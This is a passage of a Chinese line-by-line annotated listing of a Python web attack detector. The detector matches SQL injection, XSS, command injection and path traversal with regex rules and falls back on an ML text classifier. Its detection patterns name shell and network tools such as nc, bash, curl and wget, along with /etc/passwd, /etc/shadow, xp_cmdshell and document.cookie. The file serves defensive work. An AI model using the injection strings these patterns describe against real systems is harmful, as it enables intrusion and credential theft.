| 20 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Dict, Optional, Pattern` |
| 21 | 导入对象：从指定模块引入类、函数或常量。 | `from urllib.parse import unquote` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import joblib` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.feature_schemas import validate_payload_against_schema` |
| 26 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.manifest import ManifestLoadError, ModelManifest, resolve_model_entry` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 导入对象：从指定模块引入类、函数或常量。 | `from .base import BaseDetector, DetectionResult` |
| 29 | 导入对象：从指定模块引入类、函数或常量。 | `from .inference_meta import set_inference_meta` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 类定义：声明 `WebAttackDetector`，封装相关状态与行为。 | `class WebAttackDetector(BaseDetector):` |
| 35 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 36 | 代码语句：参与当前文件的业务流程或数据处理。 | `    Web 攻击检测引擎。` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `    规则引擎覆盖以下 4 类常见 Web 攻击：` |
| 39 | 代码语句：参与当前文件的业务流程或数据处理。 | `        - sql_injection` |
| 40 | 代码语句：参与当前文件的业务流程或数据处理。 | `        - xss` |
| 41 | 代码语句：参与当前文件的业务流程或数据处理。 | `        - command_injection` |
| 42 | 代码语句：参与当前文件的业务流程或数据处理。 | `        - path_traversal` |
| 43 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 44 | 代码语句：参与当前文件的业务流程或数据处理。 | `    规则未命中时，会交给 ML 模型做文本分类（如果已加载）。` |
| 45 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 注释：解释下面或当前这段代码的设计意图。 | `    # 每类攻击对应的关键字/正则模式` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    RULES: Dict[str, Pattern[str]] = {` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "sql_injection": re.compile(` |
| 50 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"("` |
| 51 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"union\s+select"` |
| 52 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|select\s+.+\s+from"` |
| 53 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|insert\s+into"` |
| 54 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|drop\s+table"` |
| 55 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|delete\s+from"` |
| 56 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|or\s+1\s*=\s*1"` |
| 57 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|and\s+1\s*=\s*1"` |
| 58 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|'\s*or\s*'"` |
| 59 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|xp_cmdshell"` |
| 60 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|information_schema"` |
| 61 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|sleep\s*\("` |
| 62 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|benchmark\s*\("` |
| 63 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|extractvalue\s*\("` |
| 64 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|updatexml\s*\("` |
| 65 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r")",` |
| 66 | 代码语句：参与当前文件的业务流程或数据处理。 | `            re.IGNORECASE,` |
| 67 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "xss": re.compile(` |
| 69 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"("` |
| 70 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"<\s*script"` |
| 71 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|</\s*script\s*>"` |
| 72 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|javascript\s*:"` |
| 73 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|on(?:error\|load\|click\|mouseover\|focus\|toggle\|start)\s*="` |
| 74 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|alert\s*\("` |
| 75 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|document\.(?:cookie\|domain\|write)"` |
| 76 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|window\.(?:location\|open)"` |
| 77 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|eval\s*\("` |
| 78 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|<\s*svg[^>]*on"` |
| 79 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|<\s*img[^>]*onerror"` |
| 80 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r")",` |
| 81 | 代码语句：参与当前文件的业务流程或数据处理。 | `            re.IGNORECASE,` |
| 82 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "command_injection": re.compile(` |
| 84 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"("` |
| 85 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r";\s*(?:cat\|ls\|id\|whoami\|uname\|pwd\|wget\|curl\|nc\|bash\|sh\|python\|perl)\b"` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|\\|\s*(?:cat\|ls\|id\|whoami\|nc\|bash\|sh)\b"` |
| 87 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|\`\s*(?:cat\|ls\|id\|whoami)"` |
| 88 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|\$\(\s*(?:cat\|ls\|id\|whoami\|curl\|wget)"` |
| 89 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"\|&&\s*(?:cat\|ls\|id\|whoami\|rm)\b"` |
| 90 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r")",` |
| 91 | 代码语句：参与当前文件的业务流程或数据处理。 | `            re.IGNORECASE,` |
| 92 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "path_traversal": re.compile(` |
| 94 | 函数调用：执行已有函数/方法完成当前步骤。 | `            r"("` |
| 95 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\.\./"` |
| 96 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|\.\.\\"` |
| 97 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|%2e%2e%2f"` |
| 98 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|%2e%2e/"` |
| 99 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|%252e%252e"` |
| 100 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|\.\.%2f"` |
| 101 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|/etc/passwd"` |
| 102 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|/etc/shadow"` |
| 103 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|/proc/self"` |
| 104 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r"\|c:\\windows\\system32"` |
| 105 | 代码语句：参与当前文件的业务流程或数据处理。 | `            r")",` |
| 106 | 代码语句：参与当前文件的业务流程或数据处理。 | `            re.IGNORECASE,` |
| 107 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 108 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 109 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    RULE_CONFIDENCE: float = 0.95` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ML_CONFIDENCE_THRESHOLD: float = 0.7` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    MAX_DECODE_ITERATIONS: int = 5` |
| 113 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 114 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self) -> None:` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ml_model = None` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._manifest: Optional[ModelManifest] = None` |
| 117 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 118 | 函数定义：声明 `clear_ml_state` 的输入、处理逻辑和返回结果。 | `    def clear_ml_state(self) -> None:` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ml_model = None` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._manifest = None` |
| 121 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 122 | 函数定义：声明 `load_model` 的输入、处理逻辑和返回结果。 | `    def load_model(self, model_path: str) -> None:` |
| 123 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 124 | 代码语句：参与当前文件的业务流程或数据处理。 | `        加载 TF-IDF + 朴素贝叶斯 Pipeline 模型及 \`\`*.model_manifest.json\`\`。` |
| 125 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 126 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            model_path: 模型文件路径，如 'models/saved/web_attack_nb_v1.pkl'。` |
| 128 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 129 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self.clear_ml_state()` |
| 130 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 131 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ap, manifest = resolve_model_entry(model_path)` |
| 132 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except ManifestLoadError as exc:` |
| 133 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[AUDIT] Web ML 拒绝加载（manifest 无效）: %s", exc)` |
| 134 | 代码语句：参与当前文件的业务流程或数据处理。 | `            raise` |
| 135 | 条件判断：满足条件时进入对应分支。 | `        if not os.path.isfile(ap):` |
| 136 | 抛出异常：主动报告不可继续的错误。 | `            raise FileNotFoundError(ap)` |
| 137 | 条件判断：满足条件时进入对应分支。 | `        if manifest.model_input_mode != "text_sklearn_pipeline":` |
| 138 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError("WebAttackDetector 需要 model_input_mode=text_sklearn_pipeline")` |
| 139 | 条件判断：满足条件时进入对应分支。 | `        if manifest.schema_name != "web_request_v1":` |
| 140 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError("WebAttackDetector 需要 schema_name=web_request_v1")` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._manifest = manifest` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.ml_model = joblib.load(ap)` |
| 143 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.info(` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `            "[WebAttackDetector] ML+manifest 加载成功 schema=%s (%s)",` |
| 145 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._manifest.schema_name,` |
| 146 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ap,` |
| 147 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 148 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 149 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 150 | 函数定义：声明 `is_ready` 的输入、处理逻辑和返回结果。 | `    def is_ready(self) -> bool:` |
| 151 | 文档字符串：说明当前模块、类或函数的职责。 | `        """规则引擎永远可用，因此恒为 True。"""` |
| 152 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 153 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 154 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 155 | 注释：解释下面或当前这段代码的设计意图。 | `    # 安全工具方法` |
| 156 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 157 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 158 | 函数定义：声明 `_decode_url` 的输入、处理逻辑和返回结果。 | `    def _decode_url(url: str) -> str:` |
| 159 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 160 | 代码语句：参与当前文件的业务流程或数据处理。 | `        多层 URL 解码（最多 5 轮）以抵御编码绕过。` |
| 161 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 162 | 代码语句：参与当前文件的业务流程或数据处理。 | `        攻击者常利用 \`%252e%252e%2f\` 这样的嵌套编码绕过只做一次 urldecode 的` |
| 163 | 代码语句：参与当前文件的业务流程或数据处理。 | `        规则引擎。本方法持续调用 urllib.parse.unquote，直到解码结果稳定` |
| 164 | 代码语句：参与当前文件的业务流程或数据处理。 | `        或达到最大轮次。` |
| 165 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 166 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            url: 待解码的原始 URL。` |
| 168 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 169 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 170 | 代码语句：参与当前文件的业务流程或数据处理。 | `            解码后的字符串。若解码途中出现异常则返回当前阶段结果。` |
| 171 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 172 | 条件判断：满足条件时进入对应分支。 | `        if not isinstance(url, str):` |
| 173 | 返回结果：把处理后的值交回调用方。 | `            return ""` |
| 174 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 175 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        decoded = url` |
| 176 | 循环：逐个处理集合或迭代器中的元素。 | `        for _ in range(WebAttackDetector.MAX_DECODE_ITERATIONS):` |
| 177 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 178 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                new_decoded = unquote(decoded)` |
| 179 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 180 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning("[WebAttackDetector] URL 解码异常: %s", exc)` |
| 181 | 跳出循环：提前结束当前循环。 | `                break` |
| 182 | 条件判断：满足条件时进入对应分支。 | `            if new_decoded == decoded:` |
| 183 | 跳出循环：提前结束当前循环。 | `                break` |
| 184 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            decoded = new_decoded` |
| 185 | 返回结果：把处理后的值交回调用方。 | `        return decoded` |
| 186 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 187 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 188 | 注释：解释下面或当前这段代码的设计意图。 | `    # 检测主流程` |
| 189 | 注释：解释下面或当前这段代码的设计意图。 | `    # ------------------------------------------------------------------` |
| 190 | 函数定义：声明 `detect` 的输入、处理逻辑和返回结果。 | `    def detect(self, features: Dict) -> Optional[DetectionResult]:` |
| 191 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 192 | 代码语句：参与当前文件的业务流程或数据处理。 | `        对输入 Web 请求特征进行攻击检测。` |
| 193 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 194 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Args:` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            features: 特征字典，优先使用 'url_raw'，其次 'url'。` |
| 196 | 代码语句：参与当前文件的业务流程或数据处理。 | `                      可选字段 'src_ip' 用于标记来源。` |
| 197 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 198 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Returns:` |
| 199 | 代码语句：参与当前文件的业务流程或数据处理。 | `            DetectionResult（永不返回 None，因为规则引擎始终可用）。` |
| 200 | 文档字符串边界：开始或结束模块/类/函数说明。 | `        """` |
| 201 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        t0 = time.perf_counter()` |
| 202 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 203 | 函数定义：声明 `finish` 的输入、处理逻辑和返回结果。 | `        def finish(` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            res: Optional[DetectionResult],` |
| 205 | 代码语句：参与当前文件的业务流程或数据处理。 | `            *,` |
| 206 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            model_version: Optional[str] = None,` |
| 207 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            schema_version: Optional[str] = None,` |
| 208 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ) -> Optional[DetectionResult]:` |
| 209 | 返回结果：把处理后的值交回调用方。 | `            return set_inference_meta(` |
| 210 | 代码语句：参与当前文件的业务流程或数据处理。 | `                res,` |
| 211 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                engine="WebAttackDetector",` |
| 212 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                manifest=self._manifest,` |
| 213 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                latency_ms=(time.perf_counter() - t0) * 1000.0,` |
| 214 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                model_version=model_version,` |
| 215 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                schema_version=schema_version,` |
| 216 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 217 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 218 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        url = features.get("url_raw") or features.get("url") or ""` |
| 219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        src_ip = str(features.get("src_ip", "") or "").strip()` |
| 220 | 条件判断：满足条件时进入对应分支。 | `        if not src_ip:` |
| 221 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            wr = features.get("web_request_v1")` |
| 222 | 条件判断：满足条件时进入对应分支。 | `            if isinstance(wr, dict):` |
| 223 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                src_ip = str(wr.get("src_ip", "") or "").strip()` |
| 224 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 225 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        decoded_url = self._decode_url(url)` |
| 226 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 227 | 注释：解释下面或当前这段代码的设计意图。 | `        # 1) 规则引擎快速通道（对解码后的 URL 进行匹配）` |
| 228 | 循环：逐个处理集合或迭代器中的元素。 | `        for attack_type, pattern in self.RULES.items():` |
| 229 | 条件判断：满足条件时进入对应分支。 | `            if pattern.search(decoded_url):` |
| 230 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.info(` |
| 231 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    "[WebAttackDetector] 规则命中 type=%s url=%s ip=%s",` |
| 232 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    attack_type,` |
| 233 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    url,` |
| 234 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    src_ip,` |
| 235 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 236 | 返回结果：把处理后的值交回调用方。 | `                return finish(` |
| 237 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    DetectionResult(` |
| 238 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        threat_type="web_attack",` |
| 239 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        threat_level="high",` |
| 240 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        confidence=self.RULE_CONFIDENCE,` |
| 241 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        details=f"规则引擎命中：{attack_type}",` |
| 242 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        source_ip=src_ip,` |
| 243 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                        raw_data={` |
| 244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            "rule": attack_type,` |
| 245 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            "url_raw": url,` |
| 246 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            "url_decoded": decoded_url,` |
| 247 | 代码语句：参与当前文件的业务流程或数据处理。 | `                        },` |
| 248 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    ),` |
| 249 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    model_version="rule_engine",` |
| 250 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    schema_version="",` |
| 251 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 252 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 253 | 注释：解释下面或当前这段代码的设计意图。 | `        # 2) ML 文本分类兜底（须通过 web_request_v1 契约 + manifest.feature_columns）` |
| 254 | 条件判断：满足条件时进入对应分支。 | `        if self.ml_model is not None and self._manifest is not None:` |
| 255 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            merged = dict(features)` |
| 256 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            merged["url"] = url or merged.get("url") or ""` |
| 257 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            merged["decoded_url"] = decoded_url` |
| 258 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            merged["url_decoded"] = decoded_url` |
| 259 | 函数调用：执行已有函数/方法完成当前步骤。 | `            merged.setdefault("http_method", merged.get("method", "GET"))` |
| 260 | 函数调用：执行已有函数/方法完成当前步骤。 | `            merged.setdefault("method", merged.get("http_method", "GET"))` |
| 261 | 函数调用：执行已有函数/方法完成当前步骤。 | `            merged.setdefault("status_code", merged.get("status_code", 200))` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            merged["src_ip"] = src_ip or merged.get("src_ip", "")` |
| 263 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 264 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ok_schema, schema_errs = validate_payload_against_schema(` |
| 265 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "web_request_v1", merged` |
| 266 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 267 | 条件判断：满足条件时进入对应分支。 | `            if not ok_schema:` |
| 268 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning(` |
| 269 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    "[AUDIT] Web ML 降级为仅规则：web_request_v1 契约失败 %s ip=%s",` |
| 270 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    schema_errs,` |
| 271 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    src_ip,` |
| 272 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 273 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 274 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                cols = self._manifest.feature_columns` |
| 275 | 条件判断：满足条件时进入对应分支。 | `                if not cols:` |
| 276 | 日志记录：输出运行状态、调试信息或异常线索。 | `                    logger.warning("[AUDIT] Web ML manifest feature_columns 为空，跳过 ML")` |
| 277 | 兜底分支：处理前面条件都不满足的情况。 | `                else:` |
| 278 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    text_key = cols[0]` |
| 279 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    text_val = str(merged.get(text_key, "") or "")` |
| 280 | 条件判断：满足条件时进入对应分支。 | `                    if not text_val.strip():` |
| 281 | 日志记录：输出运行状态、调试信息或异常线索。 | `                        logger.warning(` |
| 282 | 代码语句：参与当前文件的业务流程或数据处理。 | `                            "[AUDIT] Web ML 降级：缺文本列 %r（与 manifest 顺序对齐） ip=%s",` |
| 283 | 代码语句：参与当前文件的业务流程或数据处理。 | `                            text_key,` |
| 284 | 代码语句：参与当前文件的业务流程或数据处理。 | `                            src_ip,` |
| 285 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        )` |
| 286 | 兜底分支：处理前面条件都不满足的情况。 | `                    else:` |
| 287 | 异常保护：尝试执行可能失败的逻辑。 | `                        try:` |
| 288 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            prediction = self.ml_model.predict([text_val])[0]` |
| 289 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            proba = self.ml_model.predict_proba([text_val])[0]` |
| 290 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            max_prob = float(max(proba))` |
| 291 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                        except Exception as exc:` |
| 292 | 日志记录：输出运行状态、调试信息或异常线索。 | `                            logger.error("[WebAttackDetector] ML 推理失败: %s", exc)` |
| 293 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            prediction = "normal"` |
| 294 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            max_prob = 0.0` |
| 295 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 296 | 条件判断：满足条件时进入对应分支。 | `                        if str(prediction).lower() != "normal":` |
| 297 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                            threat_level = (` |
| 298 | 代码语句：参与当前文件的业务流程或数据处理。 | `                                "medium"` |
| 299 | 条件判断：满足条件时进入对应分支。 | `                                if max_prob > self.ML_CONFIDENCE_THRESHOLD` |
| 300 | 兜底分支：处理前面条件都不满足的情况。 | `                                else "low"` |
| 301 | 函数调用：执行已有函数/方法完成当前步骤。 | `                            )` |
| 302 | 日志记录：输出运行状态、调试信息或异常线索。 | `                            logger.info(` |
| 303 | 代码语句：参与当前文件的业务流程或数据处理。 | `                                "[WebAttackDetector] ML 命中 type=%s confidence=%.4f",` |
| 304 | 代码语句：参与当前文件的业务流程或数据处理。 | `                                prediction,` |
| 305 | 代码语句：参与当前文件的业务流程或数据处理。 | `                                max_prob,` |
| 306 | 函数调用：执行已有函数/方法完成当前步骤。 | `                            )` |
| 307 | 返回结果：把处理后的值交回调用方。 | `                            return finish(` |
| 308 | 函数调用：执行已有函数/方法完成当前步骤。 | `                                DetectionResult(` |
| 309 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                                    threat_type="web_attack",` |
| 310 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                                    threat_level=threat_level,` |
| 311 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                                    confidence=max_prob,` |
| 312 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                                    details=f"ML 检测：{prediction}",` |
| 313 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                                    source_ip=src_ip,` |
| 314 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                                    raw_data={` |
| 315 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                                        "ml_prediction": str(prediction),` |
| 316 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                                        "url_raw": url,` |
| 317 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                                        "url_decoded": decoded_url,` |
| 318 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                                        "manifest_version": self._manifest.version,` |
| 319 | 代码语句：参与当前文件的业务流程或数据处理。 | `                                    },` |
| 320 | 代码语句：参与当前文件的业务流程或数据处理。 | `                                ),` |
| 321 | 函数调用：执行已有函数/方法完成当前步骤。 | `                            )` |
| 322 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 323 | 注释：解释下面或当前这段代码的设计意图。 | `        # 3) 规则未命中且 ML 未检出攻击，视为正常` |
| 324 | 返回结果：把处理后的值交回调用方。 | `        return finish(` |
| 325 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult(` |
| 326 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_type="normal",` |
| 327 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_level="low",` |
